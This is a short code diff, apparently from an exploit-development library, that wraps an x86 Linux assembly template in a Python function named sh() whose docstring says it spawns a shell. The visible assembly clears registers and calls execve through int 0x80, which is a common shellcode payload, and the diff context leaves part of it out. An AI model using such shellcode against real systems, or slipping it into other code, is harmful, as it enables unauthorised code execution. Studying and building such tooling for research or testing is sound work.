@@ -1,3 +1,7 @@
+def sh():
+    """Arguments: None
+    Spawn a shell."""
+    return """
         ;; ECX or EAX must be cleared upon entry
 
         ;; Clear eax, ecx, edx
@@ -12,3 +16,4 @@
         mov al, SYS_execve
         mov ebx, esp
         int 0x80
+"""
